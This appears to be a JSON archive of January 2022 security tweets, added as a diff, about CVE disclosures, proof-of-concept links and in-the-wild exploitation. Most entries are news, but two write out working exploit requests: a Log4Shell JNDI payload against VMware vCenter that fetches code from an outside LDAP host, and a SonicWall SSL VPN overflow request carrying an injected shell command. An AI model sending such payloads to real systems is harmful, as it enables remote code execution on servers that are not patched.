+    "tweettime": "2022-01-26, 03:28:41",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1486179258515210240",
+    "username": "piedpiper1616"
+}
+{
+    "tweetfavorites": 546,
+    "tweetquotes": 17,
+    "tweetreplies": 13,
+    "tweetretweets": 99,
+    "tweettext": "Why compile, when you can just pipe curl to bash?? 🤣😂🤣CVE-2021-4034 https://t.co/zUBAFzMGZR",
+    "tweettime": "2022-01-26, 01:07:54",
+    "tweeturl": "https://twitter.com/_JohnHammond/status/1486143827262033920",
+    "username": "_JohnHammond"
+}
+{
+    "expanded_url": [
+        "https://twitter.com/HaifeiLi/status/1458144361561034756",
+        "https://www.trellix.com/en-gb/about/newsroom/stories/threat-labs/prime-ministers-office-compromised.html"
+    ],
+    "tweetfavorites": 100,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 31,
+    "tweettext": "Remember in November Patch Tuesday Microsoft fixed an Excel zero-day attack in the wild (CVE-2021-42292) but no details shared (https://t.co/UN3bNYg8Tg)? Well, after reading the Trellix (formerly McAfee) blogpost https://t.co/TYsBZlbwMX, I think I figured it out.:). A thread.",
+    "tweettime": "2022-01-26, 00:25:47",
+    "tweeturl": "https://twitter.com/HaifeiLi/status/1486133229614616577",
+    "username": "HaifeiLi"
+}
+{
+    "tweetfavorites": 306,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 80,
+    "tweettext": "The exploit for CVE-2021-4034 is both simple and universal.  What's not to love? https://t.co/ZRsbd0So53",
+    "tweettime": "2022-01-25, 22:39:44",
+    "tweeturl": "https://twitter.com/wdormann/status/1486106541665226753",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://www.openwall.com/lists/oss-security/2022/01/25/14"
+    ],
+    "tweetfavorites": 697,
+    "tweetquotes": 5,
+    "tweetreplies": 4,
+    "tweetretweets": 197,
+    "tweettext": "Now that the discoverers have published their exploit and writeup, I sent my exploit and writeup for CVE-2022-0185 (Linux kernel integer underflow to slab OOB write) to the oss-security mailing list: https://t.co/ZREvAFG3Xd https://t.co/trNCNNWLdM",
+    "tweettime": "2022-01-25, 21:50:52",
+    "tweeturl": "https://twitter.com/lockedbyte/status/1486094243210878978",
+    "username": "lockedbyte"
+}
+{
+    "expanded_url": [
+        "https://www.openwall.com/lists/oss-security/2022/01/25/11"
+    ],
+    "tweetfavorites": 303,
+    "tweetquotes": 9,
+    "tweetreplies": 0,
+    "tweetretweets": 100,
+    "tweettext": "The @qualys team is back at it!\n\npwnkit: Local Privilege Escalation in polkit’s pkexec (CVE-2021-4034)\n\nhttps://t.co/of1WtdEJmK https://t.co/qAdWtuICqB",
+    "tweettime": "2022-01-25, 21:21:42",
+    "tweeturl": "https://twitter.com/0xdea/status/1486086902986035207",
+    "username": "0xdea"
+}
+{
+    "tweetfavorites": 81,
+    "tweetquotes": 4,
+    "tweetreplies": 6,
+    "tweetretweets": 30,
+    "tweettext": "Some attempts itw on CVE-2021-20038 (SonicWall SMA RCE). Also some password spraying of default passwords from the past few days\n\nRemember to update AND change default passwords :) https://t.co/WyDIXVKb4m",
+    "tweettime": "2022-01-24, 17:52:20",
+    "tweeturl": "https://twitter.com/buffaloverflow/status/1485671824725786633",
+    "username": "buffaloverflow"
+}
+{
+    "expanded_url": [
+        "https://octagon.net/blog/2022/01/22/cve-2021-45467-cwp-centos-web-panel-preauth-rce/"
+    ],
+    "tweetfavorites": 406,
+    "tweetquotes": 7,
+    "tweetreplies": 6,
+    "tweetretweets": 176,
+    "tweettext": "Our first blog post is up! \n\nCVE-2021-45467: Preauth RCE in CentOS Web Panel affecting 200k+ web servers on Shodan (pls patch). We bypass strstr() based LFI protection and put a shell on the server. \nhttps://t.co/DvyakBkajj #bugbounty #bugbountytip https://t.co/0Z0cPU6HFl",
+    "tweettime": "2022-01-22, 04:05:04",
+    "tweeturl": "https://twitter.com/OctagonNetworks/status/1484738862865739782",
+    "username": "OctagonNetworks"
+}
+{
+    "tweetfavorites": 561,
+    "tweetquotes": 10,
+    "tweetreplies": 9,
+    "tweetretweets": 181,
+    "tweettext": "CVE-2021-44515 - Reset the admin password unauthenticated and login!\n\nPoC: https://t.co/IyGdbZ89AU",
+    "tweettime": "2022-01-21, 16:32:50",
+    "tweeturl": "https://twitter.com/steventseeley/status/1484564654219272195",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://packetstormsecurity.com/files/165642/VMware-vCenter-Server-Unauthenticated-Log4Shell-JNDI-Injection-Remote-Code-Execution.html"
+    ],
+    "tweetfavorites": 332,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 130,
+    "tweettext": "VMware vCenter Server Unauthenticated Log4Shell JNDI Injection RCE (CVE-2021-44228)\n\nGET /websso/SAML2/SLO/vsphere.local?SAMLRequest= HTTP/1.1\nX-Forwarded-For: ${jndi:ldap://10.10.10.10:1389/Exploit}\n\nhttps://t.co/NDKkQK3csc",
+    "tweettime": "2022-01-21, 07:13:22",
+    "tweeturl": "https://twitter.com/wugeej/status/1484423859797622784",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/01/microsoft-hackers-exploiting-new.html"
+    ],
+    "tweetfavorites": 133,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 115,
+    "tweettext": "#Microsoft has detected hackers exploiting a new zero-day vulnerability (CVE-2021-35247) in #SolarWinds Serv-U software related to #Log4j attacks.\n\nRead: https://t.co/Cc6iyLZ7RS\n\nServ-U version 15.3 has been released to patch the issue.\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-01-20, 05:00:38",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1484028070692782083",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://vuls.cert.org/confluence/display/Wiki/2021/06/21/Finding+Privilege+Escalation+Vulnerabilities+in+Windows+using+Process+Monitor"
+    ],
+    "tweetfavorites": 214,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 61,
+    "tweettext": "Reminder:\nFinding privilege escalation vulnerabilities in Windows using Process Monitor is perhaps the easiest way to find a vulnerability, ever.\nSee CVE-2022-0166\nhttps://t.co/cHg2W0khSS https://t.co/8amdUcprgj",
+    "tweettime": "2022-01-19, 13:48:39",
+    "tweeturl": "https://twitter.com/wdormann/status/1483798563092107266",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21907",
+        "https://github.com/antx-code/CVE-2022-21907"
+    ],
+    "tweetfavorites": 181,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 63,
+    "tweettext": "CVE-2022-21907: HTTP Protocol Stack Remote Code Execution Vulnerability\nhttps://t.co/z2Jwhy3OU3\nPoC\nhttps://t.co/PEg6bHlccW https://t.co/xGWChBTroc",
+    "tweettime": "2022-01-18, 18:14:10",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1483502992959623168",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 135,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 38,
+    "tweettext": "[#thread 🧵] Last week in #Microsoft #PatchTuesday, a critical vulnerability was patched that theoretically allows attackers to achieve Remote Code Execution on a target #IIS server (CVE-2022-21907). I'll explain how it works in this thread ⬇️ https://t.co/edEpUSq7uv",
+    "tweettime": "2022-01-18, 16:57:12",
+    "tweeturl": "https://twitter.com/podalirius_/status/1483483624045481992",
+    "username": "podalirius_"
+}
+{
+    "expanded_url": [
+        "https://github.com/antx-code/CVE-2022-21907"
+    ],
+    "tweetfavorites": 96,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 36,
+    "tweettext": "Windows HTTP Stack Remote Code Execution Vulnerability CVE-2022-21907 https://t.co/5cKhVR6HqR",
+    "tweettime": "2022-01-18, 15:35:16",
+    "tweeturl": "https://twitter.com/Dinosn/status/1483463004578590730",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://blog.assetnote.io/2022/01/17/workspace-one-access-ssrf/"
+    ],
+    "tweetfavorites": 125,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "A few months ago, we discovered a post-auth SSRF in VMWare Workspace One Access - CVE-2021-22056 - which allowed you to steal an admin JWT via CSRF or request arbitrary URLs. Check out our blog post!  https://t.co/q0UdqFsgMJ",
+    "tweettime": "2022-01-18, 02:46:49",
+    "tweeturl": "https://twitter.com/infosec_au/status/1483269616785063936",
+    "username": "infosec_au"
+}
+{
+    "expanded_url": [
+        "https://hulkvision.github.io/blog/post1/"
+    ],
+    "tweetfavorites": 397,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 117,
+    "tweettext": "RCE in Adobe Acrobat Reader for Android (CVE-2021-40724)\n\n$10,000 bounty received from GPSRP\n\nExcellent exploitation and write-up by @hulkvision \nReport: https://t.co/NIFQnlbRiZ\n\nQuick summary how it was achieved👇 https://t.co/Ge1qKac98L",
+    "tweettime": "2022-01-14, 13:02:31",
+    "tweeturl": "https://twitter.com/LukasStefanko/status/1481975013884452867",
+    "username": "LukasStefanko"
+}
+{
+    "expanded_url": [
+        "https://attackerkb.com/topics/rJw4DFI2RQ/cve-2021-44515/rapid7-analysis"
+    ],
+    "tweetfavorites": 74,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 24,
+    "tweettext": "Analysis and PoC for ManageEngine Desktop Central CVE-2021-44515.\n\nSTATE_COOKIE=&amp;_REQS/_TIME/123\n\nhttps://t.co/bk9UyPDLI8",
+    "tweettime": "2022-01-14, 09:47:57",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1481926048065495041",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "tweetfavorites": 1742,
+    "tweetquotes": 13,
+    "tweetreplies": 41,
+    "tweetretweets": 223,
+    "tweettext": "i'll admit - when i found it, i wasn't totally sure if i could get LPE with this strange little kernel bug alone. it took triggering the vuln 4x to do a full privesc with #CVE-2021-41073, a vuln in io_uring. blog post soon :) https://t.co/2dJKDMLdUv",
+    "tweettime": "2022-01-12, 23:43:32",
+    "tweeturl": "https://twitter.com/chompie1337/status/1481411553698238465",
+    "username": "chompie1337"
+}
+{
+    "expanded_url": [
+        "https://attackerkb.com/topics/QyXRC1wbvC/cve-2021-20038/rapid7-analysis?fbclid=IwAR1ldORiwotSY0HeF_aLrYra1LuvJk7nlzfWg1HOT8AvnnvBfVcvUE1siTw"
+    ],
+    "tweetfavorites": 670,
+    "tweetquotes": 6,
+    "tweetreplies": 3,
+    "tweetretweets": 250,
+    "tweettext": "Sonicwall SSL VPN nobody BOF RCE (CVE-2021-20038)\n\nGET /%04%d7%7f%bf%18%d8%7f%bf%18%d8%7f%bf%64%b8%06%08;{touch,/tmp/lol};%04%d7%7f%bf%18%d8%7f%bf%18%d8%7f%bf%64%b8%06%08;{touch,/tmp/lol};?aaaaaaaa...\n\nhttps://t.co/y7NggxNg1I https://t.co/UjS8nqhUHr",
+    "tweettime": "2022-01-12, 06:56:52",
+    "tweeturl": "https://twitter.com/wugeej/status/1481158216390426628",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/01/first-patch-tuesday-of-2022-brings-fix.html"
+    ],
+    "tweetfavorites": 163,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 119,
+    "tweettext": "First #Microsoft Patch Tuesday update of 2022 fixes 96 new vulnerabilities, including a critical \"wormable\" Windows RCE #vulnerability (CVE-2022-21907) in the HTTP Protocol Stack.\n\nRead details: https://t.co/GNeuIIB6m2\n\n#infosec #cybersecurity",
+    "tweettime": "2022-01-12, 06:47:23",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1481155830179581952",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 98,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 22,
+    "tweettext": "First patch Tuesday of 2022! Adobe and Microsoft fixed 6 vulnerabilities reported by Kunlun lab. Two of them were demoed @TianfuCup. The CVE-2021-44706 was the RCE of PDF reader full chain and the CVE-2021-21881 was the Ntoskrnl bug for Chrome sandbox escape.",
+    "tweettime": "2022-01-11, 20:07:11",
+    "tweeturl": "https://twitter.com/mj0011sec/status/1480994719560003584",
+    "username": "mj0011sec"
+}
+{
+    "expanded_url": [
+        "https://attackerkb.com/topics/9szJhq46lw/cve-2021-20039/rapid7-analysis?referrer=twitter"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 18,
+    "tweettext": "Today, @rapid7 disclosed five zero-day vulnerabilities in SonicWall SMA 100 series devices. Technical analysis for CVE-2021-20038 (unauth stack-based buffer overflow) and CVE-2021-20039 (auth command injection) now in AttackerKB via @Junior_Baines. https://t.co/fEtmHEW94z",
+    "tweettime": "2022-01-11, 14:04:08",
+    "tweeturl": "https://twitter.com/AttackerKb/status/1480903355996250112",
+    "username": "AttackerKb"
+}
+{
+    "expanded_url": [
+        "https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/"
+    ],
+    "tweetfavorites": 681,
+    "tweetquotes": 23,
+    "tweetreplies": 14,
+    "tweetretweets": 386,
+    "tweettext": "We have observed a China-based ransomware operator that we’re tracking as DEV-0401 exploiting the CVE-2021-44228 vulnerability in Log4j 2 (aka #log4shell) targeting internet-facing systems running VMWare Horizon. https://t.co/6GOdRwRTjk",
+    "tweettime": "2022-01-11, 02:37:30",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1480730559739359233",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
+        "https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/"
+    ],
+    "tweetfavorites": 47,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 27,
+    "tweettext": "Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit https://t.co/5LSpD8bK60  #Pentesting #CVE #RCE #Exploit #CyberSecurity #Infosec https://t.co/UYQmZG2h3U",
+    "tweettime": "2022-01-09, 22:01:08",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1480298619454558215",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce"
+    ],
+    "tweetfavorites": 766,
+    "tweetquotes": 15,
+    "tweetreplies": 4,
+    "tweetretweets": 304,
+    "tweettext": "New research! Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit https://t.co/q2QwkRfrvM",
+    "tweettime": "2022-01-08, 18:15:27",
+    "tweeturl": "https://twitter.com/BillDemirkapi/status/1479879438036881417",
+    "username": "BillDemirkapi"
+}
+{
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 10,
+    "tweettext": "The Windows Active Directory Domain Services (AD DS) escalation vulnerability (CVE-2021-42287 and CVE-2021-42278 combined) is still being exploited in wild.\n\nIf u haven’t updated your windows server an attacker with normal credentials can escalate his privileges to Domain Admin.",
+    "tweettime": "2022-01-07, 12:33:50",
+    "tweeturl": "https://twitter.com/sunnynehrabro/status/1479431078532169729",
+    "username": "sunnynehrabro"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-31589.yaml",
+        "https://github.com/advisories/GHSA-fw8v-3m7h-4jwg"
+    ],
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "BeyondTrust / Bomgar Remote Support XSS (CVE-2021-31589) by @aboul3la\n\nTempalte: https://t.co/Y6VlsYzfIU\n\nReference: https://t.co/60P76u9WPA\n\n#hackwithautomation #bugbounty #pentest https://t.co/MKf8kPSN2S",
+    "tweettime": "2022-01-07, 09:03:16",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1479378090123927552",
+    "username": "pdnuclei"
+}
